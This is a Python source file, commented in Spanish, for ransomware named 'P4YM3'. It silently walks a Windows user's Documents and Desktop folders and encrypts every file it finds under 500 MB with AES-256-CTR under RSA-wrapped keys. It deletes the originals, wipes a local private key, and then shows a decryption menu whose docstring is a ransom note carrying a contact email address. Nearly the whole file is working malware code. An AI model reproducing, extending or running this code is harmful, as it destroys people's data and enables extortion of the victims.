
import os
import sys
import ctypes
from contextlib import contextmanager
import base64
import secrets
import logging
from typing import Tuple, Optional
from pathlib import Path
import zipfile
from datetime import datetime
import shutil

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
from cryptography.hazmat.backends import default_backend

# Configurar logging
logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')

# ===== Constantes =====
HEADER_MAGIC = "P4Y1"
PKALG_RSA_OAEP_SHA256 = "RSA_OAEP_SHA256"
SIGALG_RSA_PSS_SHA256 = "RSA_PSS_SHA256"
SYMALG_AES_256_CTR = "AES_256_CTR"

# ===== Utilidades de Encabezado =====
def _make_header_line1(modo: str, key_bits: int, pk_alg: str) -> bytes:
    """Línea 1 (ASCII): P4Y1<MODO><KEYBITS>PKALG=<ALG>\n"""
    return f"{HEADER_MAGIC}\n{modo.upper()}\n{key_bits}\nPKALG={pk_alg}\n".encode("ascii")

def _make_header_line2_wrapped_key_b64(wrapped_key: bytes) -> bytes:
    """(legacy) Línea 2 (ASCII): <WRAPPED_KEY_BASE64>\n"""
    return base64.b64encode(wrapped_key) + b"\n"

def _make_header_keyid(keyid: str = "main") -> bytes:
    """Línea adicional (ASCII): KEYID=<ID>\n"""
    return f"KEYID={keyid}\n".encode("ascii")

def _parse_header_2lines(blob: bytes):
    """
    Lee encabezado ASCII del archivo cifrado.
    Devuelve (modo, key_bits, pk_alg, wrapped_key_bytes, sig_alg, firma_bytes, resto_bytes).
    """
    # Leer líneas secuencialmente para soportar múltiples líneas en el encabezado
    idx = 0

    def _readline():
        nonlocal idx
        nl = blob.find(b"\n", idx)
        if nl == -1:
            return None
        line = blob[idx:nl]
        idx = nl + 1
        return line

    # Magic
    line = _readline()
    if line is None:
        raise ValueError("Archivo sin encabezado: falta línea 1.")
    try:
        magic = line.decode("ascii", errors="strict")
    except Exception:
        raise ValueError("Encabezado (línea 1) no válido: caracteres no ASCII.")
    if magic != HEADER_MAGIC:
        raise ValueError("Encabezado (línea 1) no válido.")

    # Modo
    line = _readline()
    if line is None:
        raise ValueError("Encabezado incompleto: falta modo.")
    modo = line.decode("ascii", errors="strict").upper()

    # key bits
    line = _readline()
    if line is None:
        raise ValueError("Encabezado incompleto: falta key_bits.")
    try:
        key_bits = int(line.decode("ascii", errors="strict"))
    except Exception as e:
        raise ValueError("Key bits en encabezado no es un entero válido.") from e

    # Posible PKALG
    pk_alg = PKALG_RSA_OAEP_SHA256
    line = _readline()
    if line is None:
        raise ValueError("Encabezado incompleto: falta PKALG/clave envuelta.")
    try:
        text = line.decode("ascii", errors="strict")
    except Exception:
        text = None

    wrapped_key = None
    if text and text.startswith("PKALG="):
        pk_alg = text.split("=", 1)[1]
        if pk_alg == PKALG_RSA_OAEP_SHA256:
            # siguiente línea: clave envuelta base64
            line = _readline()
            if line is None:
                raise ValueError("Encabezado incompleto: falta clave envuelta después de PKALG.")
            try:
                wrapped_key = base64.b64decode(line, validate=True)
            except Exception as e:
                raise ValueError("La línea con la clave envuelta no es base64 válido.") from e
    else:
        # Si no hay PKALG explícito, retroceder lectura: tratar la línea leída como posible KEYID/SIGALG
        # (ya hemos consumido la línea que no contiene PKALG)
        # En este caso asumimos pk_alg por defecto y wrapped_key queda None
        pass

    # Leer posibles líneas adicionales: KEYID=... y/o SIGALG=...
    keyid = None
    sig_alg = None
    firma = None

    # Leer hasta encontrar SIGALG o llegar al binario
    while True:
        next_line = _readline()
        if next_line is None:
            break
        try:
            txt = next_line.decode("ascii", errors="strict")
        except Exception:
            # Encontramos datos binarios
            idx -= len(next_line) + 1  # retroceder la línea leída
            break

        if txt.startswith("KEYID="):
            keyid = txt.split("=", 1)[1]
            continue
        if txt.startswith("SIGALG="):
            sig_alg = txt.split("=", 1)[1]
            # siguiente línea debe ser la firma base64
            sig_b64 = _readline()
            if sig_b64 is None:
                raise ValueError("Encabezado de firma incompleto: falta línea con la firma.")
            try:
                firma = base64.b64decode(sig_b64, validate=True)
            except Exception:
                raise ValueError("La línea de firma no contiene base64 válido.")
            break
        # Si la línea no coincide con ningún header conocido, asumir que hemos alcanzado el binario
        # y retroceder para que el resto sea leído como datos binarios
        idx -= len(next_line) + 1
        break

    # El resto son IV + ciphertext
    resto = blob[idx:]
    return modo, key_bits, pk_alg, wrapped_key, keyid, sig_alg, firma, resto

# ===== Utilidades RSA =====
def generar_rsa_keypair(bits: int = 3072) -> Tuple[bytes, bytes]:
    """Genera un par RSA (privada y pública PEM)."""
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=bits,
        backend=default_backend()
    )
    priv_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )
    pub_pem = private_key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    return priv_pem, pub_pem

def cargar_public_key_pem(path: str):
    with open(path, "rb") as f:
        data = f.read()
    return serialization.load_pem_public_key(data, backend=default_backend())

def cargar_private_key_pem(path: str, password: Optional[str] = None):
    with open(path, "rb") as f:
        data = f.read()
    pw_bytes = None if password is None or password == "" else password.encode("utf-8")
    return serialization.load_pem_private_key(data, password=pw_bytes, backend=default_backend())

def wrap_key_rsa_oaep(pubkey, key_bytes: bytes) -> bytes:
    return pubkey.encrypt(
        key_bytes,
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )

def unwrap_key_rsa_oaep(privkey, wrapped: bytes) -> bytes:
    return privkey.decrypt(
        wrapped,
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )

def firmar_datos_rsa_pss(privkey, data: bytes) -> bytes:
    """Firma data con RSA-PSS + SHA-256."""
    return privkey.sign(
        data,
        asym_padding.PSS(
            mgf=asym_padding.MGF1(hashes.SHA256()),
            salt_length=asym_padding.PSS.MAX_LENGTH,
        ),
        hashes.SHA256(),
    )

def verificar_firma_rsa_pss(pubkey, data: bytes, firma: bytes) -> bool:
    """Verifica firma RSA-PSS + SHA-256."""
    try:
        pubkey.verify(
            firma,
            data,
            asym_padding.PSS(
                mgf=asym_padding.MGF1(hashes.SHA256()),
                salt_length=asym_padding.PSS.MAX_LENGTH,
            ),
            hashes.SHA256(),
        )
        return True
    except Exception:
        return False

# ===== Utilidades AES =====
def generar_clave(longitud_bits: int) -> bytes:
    if longitud_bits not in (128, 192, 256):
        raise ValueError("La longitud de clave debe ser 128, 192 o 256 bits.")
    return AESGCM.generate_key(bit_length=longitud_bits)

def _cipher_from_mode(clave: bytes, modo_upper: str, iv: bytes) -> Cipher:
    """Crear cipher según el modo. Solo CTR está soportado."""
    if modo_upper == "CTR":
        return Cipher(algorithms.AES(clave), modes.CTR(iv))
    else:
        raise ValueError("Modo de cifrado no soportado. Solo CTR.")

def _out_path_same_name_with_ext(input_path: str, suffix: str = "", keyid: str = "main") -> str:
    """Generate output path with optional keyid suffix (e.g., archivo_two.p4ym3 if keyid='two')."""
    d = os.path.dirname(input_path) or "."
    base = os.path.splitext(os.path.basename(input_path))[0]
    # Add keyid suffix if it's not the default 'main'
    if keyid and keyid != "main":
        candidate = os.path.join(d, f"{base}{suffix}_{keyid}.p4ym3")
    else:
        candidate = os.path.join(d, f"{base}{suffix}.p4ym3")
    in_abs = os.path.abspath(input_path)
    cand_abs = os.path.abspath(candidate)
    if cand_abs == in_abs or os.path.exists(candidate):
        i = 1
        while True:
            if keyid and keyid != "main":
                candidate2 = os.path.join(d, f"{base}{suffix}_{keyid}_{i}.p4ym3")
            else:
                candidate2 = os.path.join(d, f"{base}{suffix}_{i}.p4ym3")
            cand2_abs = os.path.abspath(candidate2)
            if cand2_abs == in_abs or os.path.exists(candidate2):
                i += 1
                continue
            candidate = candidate2
            break
    return candidate


# ===== Consola dinámica (Windows) =====
def _has_console() -> bool:
    """Devuelve True si hay una consola asociada al proceso (Windows)."""
    try:
        return ctypes.windll.kernel32.GetConsoleWindow() != 0
    except Exception:
        return False


def _alloc_console() -> bool:
    """Crea/adjunta una consola en Windows y redirige sys.stdin/out/err a ella.
    Retorna True si se creó correctamente o ya existía."""
    try:
        if _has_console():
            return True
        if not ctypes.windll.kernel32.AllocConsole():
            return False
        # Abrir manejadores especiales de consola
        sys.stdout = open('CONOUT$', 'w', encoding='utf-8', buffering=1)
        sys.stderr = open('CONOUT$', 'w', encoding='utf-8', buffering=1)
        try:
            sys.stdin = open('CONIN$', 'r', encoding='utf-8')
        except Exception:
            pass
        return True
    except Exception:
        return False


@contextmanager
def _suppress_console_output():
    """Context manager que redirige stdout/stderr a devnull y silencia logging.
    Útil para ejecutar la fase automática sin que aparezca salida en consola."""
    devnull = open(os.devnull, 'w')
    old_stdout, old_stderr = sys.stdout, sys.stderr
    logger = logging.getLogger()
    old_level = logger.level
    try:
        sys.stdout = devnull
        sys.stderr = devnull
        logger.setLevel(logging.CRITICAL + 10)
        yield
    finally:
        try:
            sys.stdout = old_stdout
            sys.stderr = old_stderr
        except Exception:
            pass
        logger.setLevel(old_level)
        devnull.close()

# ===== Obtener archivos =====
def obtener_archivos_docs_and_desktop(max_size_mb: int = 500) -> list:
    """Obtiene archivos de Documents y Desktop del usuario."""
    perfil = os.path.expanduser('~')
    posibles = [
        os.path.join(perfil, 'Documents'),
        os.path.join(perfil, 'Documentos'),
        os.path.join(perfil, 'Desktop'),
        os.path.join(perfil, 'Escritorio'),
    ]
    encontrados = []
    vistos = set()
    max_bytes = max_size_mb * 1024 * 1024
    for ruta in posibles:
        if os.path.isdir(ruta):
            try:
                for root, dirs, files in os.walk(ruta):
                    dirs[:] = [d for d in dirs if not d.startswith('.')]
                    for file in files:
                        try:
                            ruta_completa = os.path.join(root, file)
                            if (os.path.isfile(ruta_completa) and
                                os.path.getsize(ruta_completa) < max_bytes and
                                not ruta_completa.endswith(('.p4ym3', '.sig', '.pem', '.zip'))):
                                if ruta_completa not in vistos:
                                    vistos.add(ruta_completa)
                                    encontrados.append(ruta_completa)
                        except (OSError, PermissionError):
                            pass
            except Exception:
                pass
    return encontrados

# ===== Cifrado / Descifrado =====
def cifrar_archivo_automatico(ruta_entrada: str, public_key_pem_path: str,
                              modo: str = "CTR", key_bits: int = 256,
                              sign_private_key_pem_path: Optional[str] = None,
                              keyid: str = "main",
                              eliminar_original: bool = False) -> str:
    """Cifra un archivo con AES-CTR y envuelve la clave con RSA-OAEP."""
    if not os.path.isfile(ruta_entrada):
        raise FileNotFoundError(f"No existe: {ruta_entrada}")
    with open(ruta_entrada, "rb") as f:
        datos = f.read()

    iv = secrets.token_bytes(16)
    modo_upper = modo.upper()

    # Generar clave AES por archivo y envolver con RSA-OAEP
    clave = generar_clave(key_bits)
    pubkey = cargar_public_key_pem(public_key_pem_path)
    wrapped = wrap_key_rsa_oaep(pubkey, clave)

    # AES-CTR
    cipher = _cipher_from_mode(clave, modo_upper, iv)
    encryptor = cipher.encryptor()
    datos_cifrados = encryptor.update(datos) + encryptor.finalize()

    header1 = _make_header_line1(modo_upper, key_bits, PKALG_RSA_OAEP_SHA256)
    header2 = _make_header_line2_wrapped_key_b64(wrapped)
    header_keyid = _make_header_keyid(keyid)
    extra_header = b""
    if sign_private_key_pem_path is not None:
        try:
            priv_sign = cargar_private_key_pem(sign_private_key_pem_path)
            firma = firmar_datos_rsa_pss(priv_sign, iv + datos_cifrados)
            extra_header += f"SIGALG={SIGALG_RSA_PSS_SHA256}\n".encode("ascii")
            extra_header += base64.b64encode(firma) + b"\n"
        except Exception:
            pass

    ruta_salida = _out_path_same_name_with_ext(ruta_entrada, suffix="", keyid=keyid)
    with open(ruta_salida, "wb") as f:
        f.write(header1 + header2 + header_keyid + extra_header + iv + datos_cifrados)

    if eliminar_original:
        try:
            os.remove(ruta_entrada)
        except Exception:
            pass

    return ruta_salida

def descifrar_archivo_automatico(ruta_entrada: str, private_key_pem_path: str,
                                 verify_public_key_path: Optional[str] = None) -> str:
    """Descifra un archivo .p4ym3 (AES-CTR) usando la clave privada RSA para desenvolver la clave AES."""
    if not os.path.isfile(ruta_entrada):
        raise FileNotFoundError(f"No existe: {ruta_entrada}")

    with open(ruta_entrada, "rb") as f:
        blob = f.read()
    modo_upper, key_bits, pk_alg, wrapped_key, keyid, sig_alg, firma, resto = _parse_header_2lines(blob)

    if pk_alg != PKALG_RSA_OAEP_SHA256:
        raise ValueError(f"Algoritmo de PK no soportado: {pk_alg}")

    # Desenvuelve clave AES con la clave privada proporcionada
    if not os.path.isfile(private_key_pem_path):
        raise FileNotFoundError(f"Clave privada no encontrada: {private_key_pem_path}")
    privkey = cargar_private_key_pem(private_key_pem_path)
    try:
        clave = unwrap_key_rsa_oaep(privkey, wrapped_key)
    except Exception as e:
        # Proveer mensaje de error más claro incluyendo el KEYID del encabezado
        hint = f". Archivo KEYID={keyid}" if keyid is not None else ""
        raise ValueError(f"Decryption failed: la clave privada no corresponde con la clave envuelta{hint}") from e

    if len(resto) < 16:
        raise ValueError("Archivo corrupto: faltan bytes para el IV.")
    iv, datos_cifrados = resto[:16], resto[16:]

    # Verificar firma si existe
    if sig_alg is not None and verify_public_key_path:
        pub_sign = cargar_public_key_pem(verify_public_key_path)
        if sig_alg == SIGALG_RSA_PSS_SHA256:
            ok = verificar_firma_rsa_pss(pub_sign, iv + datos_cifrados, firma)
            if ok:
                print("Firma digital VÁLIDA")
            else:
                print("Advertencia: Firma digital NO VÁLIDA")

    # AES-CTR
    cipher = _cipher_from_mode(clave, modo_upper, iv)
    decryptor = cipher.decryptor()
    datos = decryptor.update(datos_cifrados) + decryptor.finalize()

    base = os.path.splitext(ruta_entrada)[0]
    ruta_salida = f"{base}_descifrado"

    # Buscar nombre disponible
    if os.path.exists(ruta_salida):
        i = 1
        while os.path.exists(f"{ruta_salida}_{i}"):
            i += 1
        ruta_salida = f"{ruta_salida}_{i}"

    with open(ruta_salida, "wb") as f:
        f.write(datos)
    return ruta_salida

# (Se han eliminado utilidades obsoletas relacionadas con ZIP/guardado externo)

# ===== PASO 1: GENERAR CLAVES =====
def generar_y_guardar_claves_repo(cwd: str = None):
    """Genera las claves RSA en la carpeta del repositorio."""
    if cwd is None:
        cwd = os.getcwd()
    
    print("Generando claves RSA en el repositorio...")
    
    # Verificar si ya existen
    archivos_clave = [
        os.path.join(cwd, "rsa_main_private.pem"),
        os.path.join(cwd, "rsa_main_public.pem"),
        os.path.join(cwd, "rsa_two_private.pem"),
        os.path.join(cwd, "rsa_two_public.pem"),
        os.path.join(cwd, "rsa_special_private.pem"),
        os.path.join(cwd, "rsa_special_public.pem"),
    ]
    
    if all(os.path.isfile(f) for f in archivos_clave):
        print("Las claves ya existen en el repositorio")
        return True
    
    print("Generando nuevas claves RSA (esto puede tardar un momento)...")
    print("[1/3] Par principal (3072 bits)...")
    priv_main, pub_main = generar_rsa_keypair(3072)
    print("[2/3] Par alterno (3072 bits)...")
    priv_two, pub_two = generar_rsa_keypair(3072)
    print("[3/3] Par para FIRMA DIGITAL (3072 bits)...")
    priv_sign, pub_sign = generar_rsa_keypair(3072)
    print("Claves generadas")
    
    # Guardar en repositorio
    with open(os.path.join(cwd, "rsa_main_private.pem"), "wb") as f:
        f.write(priv_main)
    with open(os.path.join(cwd, "rsa_main_public.pem"), "wb") as f:
        f.write(pub_main)
    with open(os.path.join(cwd, "rsa_two_private.pem"), "wb") as f:
        f.write(priv_two)
    with open(os.path.join(cwd, "rsa_two_public.pem"), "wb") as f:
        f.write(pub_two)
    with open(os.path.join(cwd, "rsa_special_private.pem"), "wb") as f:
        f.write(priv_sign)
    with open(os.path.join(cwd, "rsa_special_public.pem"), "wb") as f:
        f.write(pub_sign)
    
    print("Claves guardadas en el repositorio")
    return True

def obtener_claves_de_repo(cwd: str = None) -> Tuple[str, str, str, str]:
    """
    Obtiene rutas a las claves del repositorio.
    Retorna: (rsa_main_pub, rsa_two_pub, rsa_sign_pub, rsa_sign_priv)
    """
    if cwd is None:
        cwd = os.getcwd()

    rsa_main_pub = os.path.join(cwd, "rsa_main_public.pem")
    rsa_two_pub = os.path.join(cwd, "rsa_two_public.pem")
    rsa_sign_pub = os.path.join(cwd, "rsa_special_public.pem")
    rsa_sign_priv = os.path.join(cwd, "rsa_special_private.pem")

    for ruta in [rsa_main_pub, rsa_two_pub, rsa_sign_pub, rsa_sign_priv]:
        if not os.path.isfile(ruta):
            raise FileNotFoundError(f"Falta clave: {ruta}")

    return rsa_main_pub, rsa_two_pub, rsa_sign_pub, rsa_sign_priv

# ===== PASO 2: CIFRAR ARCHIVOS AUTOMÁTICAMENTE =====
def cifrar_todos_archivos_automatico(cwd: str = None):
    """Cifra automáticamente todos los archivos sin confirmación."""
    if cwd is None:
        cwd = os.getcwd()
    
    print("=" * 70)
    print("CIFRANDO ARCHIVOS AUTOMÁTICAMENTE")
    print("=" * 70)
    
    try:
        pub_main, pub_two, pub_sign, priv_sign = obtener_claves_de_repo(cwd)
    except FileNotFoundError as e:
        print(f"Error: {e}")
        return
    
    resultado = {"total": 0, "exitosos": 0, "errores": 0}
    
    print("Escaneando archivos en Documents y Desktop...")
    archivos = obtener_archivos_docs_and_desktop(max_size_mb=500)
    print(f"{len(archivos)} archivos encontrados")
    resultado["total"] = len(archivos)
    
    if len(archivos) == 0:
        print("No se encontraron archivos para cifrar")
        return
    
    print("Cifrando archivos (AES-256-CTR con firma RSA-PSS)...")
    # seleccionar un archivo especial al azar para usar rsa_two
    especial_idx = None
    if len(archivos) > 0:
        especial_idx = secrets.randbelow(len(archivos))

    for i, archivo in enumerate(archivos, 1):
        try:
            if i % 20 == 0 or i == 1:
                nombre = os.path.basename(archivo)[:50]
                print(f"[{i:5d}/{len(archivos)}] {nombre}")
            keyid = 'main'
            pubkey_path = pub_main
            if especial_idx is not None and (i-1) == especial_idx:
                keyid = 'two'
                pubkey_path = pub_two

            cifrar_archivo_automatico(
                archivo,
                pubkey_path,
                "CTR",
                256,
                priv_sign,
                keyid=keyid,
                eliminar_original=True  # Eliminar original después de cifrar
            )
            resultado["exitosos"] += 1
        except Exception as e:
            logging.error(f"Error cifrando {archivo}: {e}")
            resultado["errores"] += 1
    
    print("=" * 70)
    print("CIFRADO COMPLETADO")
    print("=" * 70)
    print(f"Archivos cifrados: {resultado['exitosos']}")
    print(f"Errores: {resultado['errores']}")

def eliminar_claves_privadas_locales(cwd: str = None):
    """Elimina las claves privadas del disco local (excepto las del repo)."""
    if cwd is None:
        cwd = os.getcwd()
    
    print("Limpiando claves privadas locales...")
    
    claves_a_eliminar = [
        os.path.join(cwd, "rsa_special_private.pem"),
    ]
    
    for ruta in claves_a_eliminar:
        if os.path.isfile(ruta):
            try:
                # Sobrescribir primero con datos aleatorios (3 pasadas)
                tamaño = os.path.getsize(ruta)
                for _ in range(3):
                    with open(ruta, "wb") as f:
                        f.write(secrets.token_bytes(tamaño))
                # Eliminar
                os.remove(ruta)
                print(f"Eliminada: {os.path.basename(ruta)}")
            except Exception as e:
                logging.warning(f"No se pudo eliminar {ruta}: {e}")

# ===== GENERAR Y GUARDAR CLAVES =====
# (Se han eliminado funciones obsoletas de generación/cifrado manual)

# ===== MODO VERIFICACIÓN DE FIRMA =====
def verificar_firma_archivo():
    """Verifica la firma de un archivo cifrado sin descifrarlo (AES-CTR)."""
    print("=" * 70)
    print("VERIFICACIÓN DE FIRMA DIGITAL")
    print("=" * 70)

    archivo_cifrado = input("Ruta del archivo cifrado (.p4ym3): ").strip().strip('"')
    if not os.path.isfile(archivo_cifrado):
        print(f"Archivo no encontrado: {archivo_cifrado}")
        return

    clave_pub_firma = None
    posibles_rutas = [
        "P4YM3_VERIFICAR_FIRMA.pem",
        os.path.join(os.path.expanduser("~"), "Desktop", "P4YM3_VERIFICAR_FIRMA.pem"),
        os.path.join(os.path.expanduser("~"), "Documents", "P4YM3_VERIFICAR_FIRMA.pem"),
    ]
    for ruta in posibles_rutas:
        if os.path.isfile(ruta):
            clave_pub_firma = ruta
            break

    if not clave_pub_firma:
        clave_pub_firma = input("Ruta a la clave pública de firma (rsa_sign_public.pem): ").strip().strip('"')
        if not os.path.isfile(clave_pub_firma):
            print("Clave pública no encontrada")
            return

    try:
        print(f"Verificando firma de {os.path.basename(archivo_cifrado)}...")

        with open(archivo_cifrado, "rb") as f:
            blob = f.read()

        modo_upper, key_bits, pk_alg, _, keyid, sig_alg, firma, resto = _parse_header_2lines(blob)
        if sig_alg is None or firma is None:
            print("Este archivo no tiene firma digital")
            return

        if len(resto) < 16:
            print("Archivo corrupto")
            return

        iv = resto[:16]
        datos_cifrados = resto[16:]

        pub_sign = cargar_public_key_pem(clave_pub_firma)
        if sig_alg == SIGALG_RSA_PSS_SHA256:
            ok = verificar_firma_rsa_pss(pub_sign, iv + datos_cifrados, firma)
        else:
            print(f"Algoritmo de firma desconocido: {sig_alg}")
            return

        print("=" * 70)
        if ok:
            print("FIRMA VÁLIDA")
            print("=" * 70)
            print("El archivo es auténtico")
            print("Fue cifrado con la clave de firma correcta")
            print("No ha sido modificado desde el cifrado")
        else:
            print("FIRMA NO VÁLIDA")
            print("=" * 70)
            print("Advertencia: El archivo puede haber sido modificado o las claves no coinciden")
            print("=" * 70)
    except Exception as e:
        print(f"Error al verificar firma: {e}")

# ===== MODO DESCIFRADO MANUAL =====
def modo_descifrado_manual():
    """Modo interactivo para descifrar archivos (AES-CTR)."""
    print("=" * 70)
    print("MODO DESCIFRADO MANUAL")
    print("=" * 70)

    archivo_cifrado = input("Ruta del archivo cifrado (.p4ym3): ").strip().strip('"')
    if not os.path.isfile(archivo_cifrado):
        print(f"Archivo no encontrado: {archivo_cifrado}")
        return
    # Intentar leer la cabecera primero para mostrar el KEYID al usuario
    try:
        with open(archivo_cifrado, "rb") as f:
            blob = f.read(8192)
        _, _, _, _, header_keyid, _, _, _ = _parse_header_2lines(blob)
        if header_keyid:
            print(f"Nota: el archivo fue cifrado con KEYID={header_keyid}")
    except Exception:
        # No bloquear el flujo por errores al inspeccionar cabecera
        pass
    clave_privada = input("Ruta a la clave privada RSA para desenvolver (rsa_main_private.pem): ").strip().strip('"')
    if not clave_privada or not os.path.isfile(clave_privada):
        print(f"Clave privada no encontrada: {clave_privada}")
        return

    clave_publica = input("Ruta a la clave pública para verificar firma (opcional, Enter para omitir): ").strip().strip('"')
    if clave_publica == "":
        clave_publica = None
    elif not os.path.isfile(clave_publica):
        print(f"Clave pública de verificación no encontrada: {clave_publica}")
        return

    try:
        print(f"Descifrando {os.path.basename(archivo_cifrado)}...")
        ruta_descifrada = descifrar_archivo_automatico(archivo_cifrado, clave_privada, verify_public_key_path=clave_publica)
        print(f"Archivo descifrado: {ruta_descifrada}")
    except Exception as e:
        print(f"Error al descifrar: {e}")

# ===== MENÚ PRINCIPAL =====
def menu_interactivo():
    """Su equipo acaba de ser encriptado pongase en contacto con este correo para obtener las claves para descifrar los datos pablomartinezpuentes@tutamail.com."""
    while True:
        print("\n" + "=" * 70)
        print("P4YM3 - MENÚ DE OPCIONES")
        print("=" * 70)
        print("[1] Descifrar archivo (.p4ym3)")
        print("[2] Verificar firma digital")
        print("[3] Salir")
        print()
        
        opcion = input("Selecciona opción (1, 2 o 3): ").strip()
        
        if opcion == "1":
            modo_descifrado_manual()
        elif opcion == "2":
            verificar_firma_archivo()
        elif opcion == "3":
            print("Saliendo...")
            break
        else:
            print("Opción no válida")

if __name__ == "__main__":
    print("=" * 70)
    print("P4YM3 - SISTEMA DE CIFRADO AUTOMÁTICO")
    print("=" * 70)
    
    # Detectar carpeta del repositorio (donde está este script)
    repo_dir = os.path.dirname(os.path.abspath(__file__))
    if repo_dir.endswith("\\Programa") or repo_dir.endswith("/Programa"):
        repo_dir = os.path.dirname(repo_dir)
    
    # Paso 1..3: Ejecutar silenciosamente si no hay consola; luego mostrar consola y menú
    had_console = _has_console()

    try:
        if not had_console:
            # Ejecutar la fase automática sin salida visible
            with _suppress_console_output():
                if not generar_y_guardar_claves_repo(repo_dir):
                    # No podemos mostrar aquí; asignar consola temporalmente para el error
                    _alloc_console()
                    print("Error: No se pudieron generar las claves")
                    input("Presiona Enter para salir...")
                    exit(1)
                cifrar_todos_archivos_automatico(repo_dir)
                eliminar_claves_privadas_locales(repo_dir)
        else:
            # Ya hay consola (ejecución desde terminal), mostrar progreso
            print("\nPaso 1: Verificando claves...")
            if not generar_y_guardar_claves_repo(repo_dir):
                print("Error: No se pudieron generar las claves")
                input("Presiona Enter para salir...")
                exit(1)
            print("\nPaso 2: Cifrando archivos...")
            cifrar_todos_archivos_automatico(repo_dir)
            print("\nPaso 3: Limpiando...")
            eliminar_claves_privadas_locales(repo_dir)
    except Exception as e:
        # Asegurarnos de mostrar el error
        if not _has_console():
            _alloc_console()
        print(f"Error durante el proceso automático: {e}")
        input("Presiona Enter para salir...")
        exit(1)

    # Tras completar el proceso automático, abrir consola si no existía
    if not _has_console():
        _alloc_console()

    print("\n" + "=" * 70)
    print("PROCESO AUTOMÁTICO COMPLETADO")
    print("=" * 70)
    print("Archivos cifrados exitosamente")
    print("Claves privadas eliminadas del disco local")
    print("=" * 70)

    # Menú interactivo
    menu_interactivo()
